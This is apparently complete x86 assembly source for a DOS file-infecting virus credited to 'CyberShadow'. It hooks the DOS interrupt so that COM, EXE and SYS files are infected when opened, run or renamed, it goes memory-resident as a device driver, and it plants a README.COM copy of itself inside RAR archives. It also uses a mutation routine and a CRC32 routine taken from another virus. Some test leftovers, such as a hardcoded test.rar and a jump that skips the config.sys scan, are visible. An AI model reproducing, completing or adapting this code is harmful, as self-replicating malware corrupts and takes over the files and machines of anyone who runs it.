;A new  CyberShadow's baby: COM/EXE/SYS/RAR infector, going to memory as DRIVER
;  as 1st:scan file 'c:\config.sys' and find all device and devicehigh entries,
;  every  file infecting and when rebooting computer one of this file makes TSR
;  copy  of  this  virus,  then when calling next functions - 3D,4B,56,4E,4F,43
;  file that setting in DS:DX, will be infected.
;  Do not infecting CO*.* (Command.com) and files that last 6 bytes is: 4 bytes
;  uppercase  english  letters and 2 bytes any different bytes (that was making
;  for  uninfect WINDOWS files: ENUNS and RUSNS) this feature used as infection
;  marker.

.model tiny
.code
.386
virusLen equ offset endheap-offset start
        org 100h
start:
	mov bp,sp
	cmp word ptr ss:[bp],'S6'
	je STRATEGY
	cmp word ptr ss:[bp],'S8'
	je INTERRUPT
        call next
next:
        pop bp
        sub bp,offset next
	pusha
        push es
        push ds
        mov ax,3521h
        int 21h

       	mov cs:[bp+NewIntIP],bx
	mov cs:[bp+NewIntCS],es
        push cs cs
        pop ds es
        lea di,cs:[bp+offset origCSIP2]
        lea si,cs:[bp+offset origCSIP]
	movsd
	movsd
	movsb
	
	lea dx,cs:[bp+file]
	call infect
	jmp ottata

	xor bp,bp
	cld
	lea dx,cs:[bp+offset config_name]
	mov ax,3d00h
	int 21h
	jc exit_scan
	xchg bx,ax
read_next_line:
	lea di,cs:[bp+offset readbuffer]
	push di
loop_read:
	mov ah,3fh
	mov cx,1
	mov dx,di
	int 21h
	cmp byte ptr ds:[di],0dh
	je exit_read_line
	inc di
	xor cx,ax
	je loop_read
	mov bp,1
exit_read_line:
	pop cx
	mov byte ptr ds:[di],0
	xchg cx,di
	sub cx,di
lets_search:
	mov eax,ds:[di]
	or eax,20202020h
	cmp eax,'ived'
	jne no_device_found
;TRY TO FOUND DEVICE NAME!
	push cx di
	mov cx,20
	mov al,'='
	repne scasb
	lea si,cs:[bp+offset readbuffer]
	push si
	xchg si,di
get_file_name:
	lodsb
	cmp al,33
	jae next_char
	xor al,al
next_char:
	stosb
	or al,al
	jne get_file_name
;LETS INFECT DIS FILE
	pop dx
;Now in DS:DX disk:\path\filename.ext,0
		call infect
	pop di cx
no_device_found:
	inc di
	dec cx
	jne lets_search
	or bp,bp
	je read_next_line
exit_scan:

ottata:
        pop ds
        pop es
	popa
	cmp byte ptr cs:[bp+fileType1],'C'
	jne restore_EXE
	mov eax,dword ptr cs:[bp+offset origCSIP2]
	mov dword ptr cs:[100h],eax
	xor bp,bp
	xor ax,ax
	push 100h
	ret
restore_EXE:
        cli
        mov ax,es
        add ax,10h
        add cs:[bp+word ptr origCSIP2+2],ax
        add ax,cs:[bp+word ptr origSPSS2]
        mov ss,ax
        mov sp,cs:[bp+word ptr origSPSS2+2]
        sti
        db 0EAh
origCSIP2 dd ?
origSPSS2 dd ?
fileType1 db 'C'
origCSIP db 0c3h,90h,90h,90h
origSPSS dd ?
fileType db 'C'
STRATEGY:
	pop bp
	call findOldSYS
OldSYS	dw 0
findOldSYS:
	pop bp
	mov ax,cs:[bp]
	mov cs:[6],ax
	sub bp,offset OldSYS
	mov cs:[bp+DeviceBX],bx
	mov cs:[bp+DeviceES],es
	push ax
	xor ax,ax
	ret
INTERRUPT:
	pop bp
	call findOldINT
OldINT	dw 0
DeviceBX dw 0
DeviceES dw 0
ourSEG	dw 0
ourIP	dw 0
findOldINT:
	pop bp
	pusha
	push ds es
	mov ax,cs:[bp]
	mov cs:[8],ax
	sub bp,offset OldINT
	push cs
	pop ds
	lea dx,cs:[bp+copyleft]
	mov ah,3dh
	int 21h
	cmp ax,0DEADh
	je AlreadyDEAD			;We're in?
	mov ax,0ba00h
	mov es,ax
	xor di,di
	mov word ptr es:[di],'CS'
	cmp word ptr es:[di],'CS'
	jne AlreadyDEAD
	cld
	lea si,cs:[bp+start]
	mov cx,virusLen
	rep movsb
	mov cs:[bp+ourSEG],es
	mov cs:[bp+ourIP],offset FinalInstall-offset start
	xor ax,ax
AlreadyDEAD:
	or ax,ax
	pop es ds
	popa
	jne AwwShit
	sub bp,offset OldINT
	push cs:[bp+ourSEG]
	push cs:[bp+ourIP]
AwwShit:
	push word ptr cs:[8]
	ret
;----------------------------------------
FinalInstall:
	pusha
	push es ds
	call FuckItHard
FuckItHard:
	pop bp
	sub bp,offset FuckItHard
	mov es,cs:[bp+DeviceES]
	mov bx,cs:[bp+DeviceBX]
	mov ax,cs
	cmp es:[bx+10h],ax
	jne OkeyDokey
        cmp word ptr es:[bx+0eh],10h
	jb weAreLoose
OkeyDokey:
	cmp word ptr es:[bx+0eh],0cbb8h
	ja weAreLoose
	mov ax,es:[bx+0eh]
	add word ptr es:[bx+0eh],virusLen
	xor dx,dx
	mov si,10h
	div si
	add ax,es:[bx+10h]
	inc ax
	mov es,ax
	xor di,di
	mov si,di
	cld
	mov cx,virusLen
        push cs
        pop ds
	rep movsb
	xor ax,ax
	mov ds,ax

	push gs
	push es
	pop gs
	les ax,dword ptr ds:[84h]
	mov gs:[bp+NewIntIP],ax
	mov gs:[bp+NewIntCS],es
	lea dx,cs:[bp+NewInt21h]
        mov word ptr ds:[86h],gs
        mov word ptr ds:[84h],dx
	pop gs
weAreLoose:
	pop ds es
	popa
	retf
copyleft db 'CyberShadow'
NewInt21h:
	pushad
	push ds es
	push ax
	pop bx
	sub bh,3dh
	je Get3DFunc
GetBack2Int:
	cmp bh,43h-3dh
	je InfectFucking
	cmp bh,3dh-3dh
	je InfectFucking
	cmp bh,4bh-3dh
	je InfectFucking
	cmp bh,4eh-3dh
	je InfectFucking
	cmp bh,4fh-3dh
	je InfectFucking
	cmp bh,56h-3dh
	jne NoFuckingInfect
InfectFucking:
	call infect
NoFuckingInfect:
	pop es ds
	popad
	db 0eah
NewIntIP dw 0
NewIntCS dw 0
Get3DFunc:
	mov si,dx
	cmp word ptr ds:[si],'yC'
	jne GetBack2Int
	pop es ds
	popad
	mov ax,0DEADh
	retf 2
int21h:
	pushf
	call dword ptr cs:[bp+NewIntIP]
	ret
NewInt24h:
	mov al,0
	iret
;-----------------------------------------------------------
infect:
	cli
	pushad
	push ds es
	push ds
	pop es
	cld
	call GetInfectDelta_
GetInfectDelta_:
	pop bp
	sub bp,offset GetInfectDelta_
	mov ax,cs
	shl eax,16
	mov ax,offset NewInt24h
	mov cs:[bp+Int24hVec],eax
	call SetInt24h
;        lea dx,cs:[bp+file]
	mov si,dx
	mov di,dx
	xor al,al
	mov cx,255
	repne scasb
	mov eax,dword ptr ds:[di-5]
	and eax,0dfdfdfffh
	mov ebx,eax
	cmp eax,'MOC.'
	jne noComExt
	mov ebx,'LLA.'
noComExt:
	cmp eax,'EXE.'
	jne noExeExt
	mov ebx,'LLA.'
noExeExt:
	mov dword ptr cs:[bp+extFType],ebx
	cmp al,'.'
	jne return
CheckForCOMM:
	cmp byte ptr ds:[di],'\'
	je CheckForCOMM1
	dec di
	cmp di,si
	jae CheckForCOMM
CheckForCOMM1:
	mov ax,ds:[di+1]
	and ax,0dfdfh
	cmp ax,'OC'
	je return
        mov ax,4300h
        call int21h
        jc return
        push cx
        push dx
        mov ax,4301h
        push ax
        xor cx,cx
        call int21h
        mov ax,3D02h
	mov dx,si
        call int21h
	jc return
        xchg bx,ax
        mov ax,5700h
        call int21h
        push cx
        push dx

        mov al,2
	call movePtr
	sub ax,6
	sbb dx,0
	xchg dx,cx
	xchg dx,ax
	mov ax,4200h
	call int21h
	push cs
	pop ds
        lea dx,cs:[bp+offset readbuffer]
	push dx
        mov ah,3Fh
        mov cx,4
        call int21h
        pop si
        mov cx,4
checkLoop:
	lodsb
	cmp al,'A'
	jb checkTry
	cmp al,'Z'
	ja checkTry
	inc ch
checkTry:
	dec cl
	jne checkLoop
	cmp ch,4
	je close

        xor al,al
	call movePtr
        mov ah,3Fh
        mov cx,1Ah
        lea dx,cs:[bp+offset readbuffer]
        call int21h

        mov al,2
	call movePtr
	cmp word ptr cs:[bp+offset readbuffer],'ZM'
        je checkEXE
        cmp word ptr cs:[bp+offset readbuffer],'aR'
        je checkRAR
        cmp ax,65000-virusLen
	ja close
        cmp word ptr cs:[bp+offset readbuffer],0ffffh
        je checkSYS
       	cmp dword ptr cs:[bp+extFType],'LLA.'
       	jne close
	mov byte ptr cs:[bp+fileType],'C'
	mov edx,dword ptr cs:[bp+offset readbuffer]
	mov dword ptr cs:[bp+origCSIP],edx
	mov byte ptr cs:[bp+offset readbuffer],0e9h
	sub ax,3
	mov word ptr cs:[bp+offset readbuffer+1],ax
	call MakePolyVirii
	jmp saveALL
checkSYS:
       	cmp dword ptr cs:[bp+extFType],'SYS.'
       	jne close
	mov byte ptr cs:[bp+fileType],'S'
	mov dx,cs:[bp+offset readbuffer+6]
	mov cs:[bp+offset oldSYS],dx
	mov dx,cs:[bp+offset readbuffer+8]
	mov cs:[bp+offset oldINT],dx
	mov cs:[bp+offset readbuffer+6],ax
	add ax,5
	mov cs:[bp+offset readbuffer+8],ax
	lea dx,cs:[bp+SYSinf]
	mov ah,40h
	mov cx,8
	call int21h
	call MakePolyVirii
	jmp saveALL
;-=-=-=-=--------------------------------------=-=-=-
checkRAR:
       	cmp dword ptr cs:[bp+extFType],'RAR.'
       	jne close
	call MakePolyVirii
	push ds
	movzx edi,word ptr cs:[bp+SavingCX]
	mov cs:[bp+RARCompressed],edi
	mov cs:[bp+RAROriginal],edi

	mov si,cs:[bp+SavingDX]
	mov ds,cs:[bp+SavingDS]

        call CRC32                           ; that we'll drop

        mov dword ptr cs:[bp+RARCrc32],eax        ; Save the CRC
        push ds
        push cs
        pop ds

        lea si,cs:[bp+offset RARHeader+2]
        mov di,FinRARHeader-RARHeader-2
        call CRC32                           ; Get CRC32 of the header
        mov word ptr cs:[bp+RARHeaderCRC],ax

        mov ah,40h
        mov cx,FinRARHeader-RARHeader
        lea dx,cs:[bp+offset RARHeader]                ; Write the header
        call int21h

        xor ax,ax
        mov word ptr cs:[bp+RARHeaderCRC],ax
        mov word ptr cs:[bp+RARCrc32],ax           ; Blank these fields
        mov word ptr cs:[bp+RARCrc32+2],ax
	pop ds
	mov cx,cs:[bp+SavingCX]
	mov dx,cs:[bp+SavingDX]

        mov ah,40h
        call int21h
        pop ds
       	jmp close
;---------------------------------=======================================
checkEXE:
       	cmp dword ptr cs:[bp+extFType],'LLA.'
       	jne close
	push cs
	pop es
	mov byte ptr cs:[bp+fileType],'E'
        lea di,cs:[bp+origCSIP]
        lea si,cs:[bp+readbuffer+14h]
        movsd
        sub si,0Ah
        movsd
        pusha
       	lea dx,cs:[bp+EXEinf]
	mov ah,40h
	mov cx,10
	call int21h
	popa

        call MakePolyVirii
        push bx
        mov bx,word ptr cs:[bp+readbuffer+8]
        shl bx,4
        push dx
        push ax
        sub ax,bx
        sbb dx,0
        mov cx,10h
        div cx
        mov word ptr cs:[bp+readbuffer+16h],ax
        mov word ptr cs:[bp+readbuffer+14h],dx
        mov word ptr cs:[bp+readbuffer+0Eh],ax
        pop ax
        pop dx
        add ax,word ptr cs:[bp+SavingCX]
        adc dx,0
        mov cl,9
        push ax
        shr ax,cl
        ror dx,cl
        stc
        adc dx,ax
        pop ax
        and ah,1
        mov word ptr cs:[bp+readbuffer+4],dx
        mov word ptr cs:[bp+readbuffer+2],ax
        pop bx
saveALL:
	push es ds
	mov cx,cs:[bp+SavingCX]
	mov dx,cs:[bp+SavingDX]
	mov ds,cs:[bp+SavingDS]
        mov ah,40h
        call int21h
	pop ds es

        xor al,al
        call movePtr
        lea dx,cs:[bp+offset readbuffer]
        mov ah,40h
        mov cx,1Ah
        call int21h
close:
        mov ax,5701h
        pop dx
        pop cx
        call int21h
        mov ah,3Eh
        call int21h
        pop ax
        pop dx
        pop cx
        call int21h
return:
	call SetInt24h
	pop es ds
	popad
	sti
        ret
movePtr:
	mov ah,42h
	xor cx,cx
        xor dx,dx
        call int21h
        ret
SetInt24h:
	push ax ds
	xor ax,ax
	mov ds,ax
	mov eax,cs:[bp+Int24hVec]
	xchg eax,ds:[90h]
	mov cs:[bp+Int24hVec],eax
	pop ds ax
	ret
MakePolyVirii:
	pusha
	push es ds
        lea si,cs:[bp+offset start]
        mov cx,virusLen
	mov ax,0ba00h
	mov es,ax
	xor di,di
	mov ax,0DEADh
	stosw
	mov dx,si
	cmp word ptr es:[di-2],ax
	jne saveVirusBody
mutateAndSave:
	xor di,di
	call mutator
saveVirusBody:
	mov cs:[bp+SavingCX],cx
	mov cs:[bp+SavingDX],dx
	mov cs:[bp+SavingDS],ds
	pop ds es
	popa
	ret
;--------------------------------------------------------------------------
CRC32:
	push bx
	cld                            ; Routine extracted from Vecna's
        push ebx                       ; Inca virus! Muito brigado, friend!
        mov ecx,-1                     ; Calculates CRC32 at runtime, no
        mov edx,ecx                    ; need of big tables. (C) Int 13h
NextByteCRC:
        xor eax,eax                    ; CyberShadow get it from 29A zine
        xor ebx,ebx
        lodsb
        xor al,cl
        mov cl,ch
        mov ch,dl
        mov dl,dh
        mov dh,8
NextBitCRC:
        shr bx,1
        rcr ax,1
        jnc NoCRC
        xor ax,08320h
        xor bx,0edb8h
NoCRC:
	dec dh
        jnz NextBitCRC
        xor ecx,eax
        xor edx,ebx
        dec di
        jnz NextByteCRC
        not edx
        not ecx
        pop ebx
        mov eax,edx
        rol eax,16
        mov ax,cx
	pop bx
        ret
;-----------------------------------------------------
RARHeader:                                      ; Header that we will add
RARHeaderCRC    dw 0                            ; We'll fill: CRC of header
RARType         db 074h                         ; File Header
RARFlags        dw 8000h
RARHeadsize     dw FinRARHeader-RARHeader
RARCompressed   dd 0                         ; Compressed and Original
RAROriginal     dd 0                         ; size are the same, we stored
RAROs           db 0                            ; OS: ms-dos
RARCrc32        dd 0                            ; We must fill this field
RARFileTime     db 063h,078h                    ; Time of the program
RARFileDate     db 031h,024h                    ; Date of the proggy
RARNeedVer      db 014h
RARMethod       db 030h                         ; Method: storing
RARFnameSize    dw FinRARHeader-RARName
RARAttrib       dd 0
RARName         db 'README.COM'                 ; Name of file to drop
FinRARHeader label byte
;-----------------------------------------------------
;-----------------------------------------------------
;-----------------------------------------------------

SYSinf  db 68h,36h,53h,0ebh,3h,68h,38h,53h
EXEinf	db 0fah,0a1h,2,0,2dh,20h,0,8eh,0d0h,0fbh
extFType dd 0
Int24hVec dd 0
SavingCX dw 0
SavingDX dw 0
SavingDS dw 0
config_name db 'c:\config.sys',0
include mutator.inc
file	db 'c:\test.rar',0
readbuffer db 255h dup (?)
endheap:
	db 'CyberShadow'
end start
